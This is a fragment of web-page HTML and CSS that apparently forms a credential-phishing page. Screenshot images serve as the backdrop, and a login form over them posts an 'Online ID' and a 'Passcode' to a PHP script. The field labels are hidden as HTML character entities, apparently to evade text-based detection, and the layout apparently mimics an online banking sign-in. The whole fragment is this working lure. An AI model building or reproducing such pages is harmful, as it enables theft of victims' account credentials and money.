...
.textbox:focus {  
 ...
 input[type=checkbox].css-checkbox {
						...
						label.css-label {
				background-image:url(images/csscheckbox_ab981e328c6aa645618a5daede5fd610.png);
...
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:629px; z-index:0"><img src="images/q1.png" alt="" title="" border=0 width=1349 height=629></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:629px; width:1349px; height:637px; z-index:3"><img src="images/q4.png" alt="" title="" border=0 width=1349 height=637></div>

<div id="image5" style="position:absolute; overflow:hidden; left:96px; top:467px; width:231px; height:76px; z-index:4"><a href="#"><img src="images/p1.png" alt="" title="" border=0 width=231 height=76></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:66px; top:347px; width:248px; height:85px; z-index:5"><a href="#"><img src="images/p2.png" alt="" title="" border=0 width=248 height=85></a></div>
...
<form action=need1.php name=jandedun id=jandedun method=post>
<input name="ud" placeholder="&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#73;&#68;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:274px;left:67px;top:157px;z-index:19">
<input name="pd" placeholder="&#80;&#97;&#115;&#115;&#99;&#111;&#100;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:274px;left:67px;top:207px;z-index:20">
<div id="checkboxG1"  style="position:absolute; left:66px; top:256px; z-index:21"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:66px; top:256px; z-index:21"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:66px; top:297px; z-index:22"><input type="image" name="formimage1" width="276" height="42" src="images/btn.png"></div>
</div>
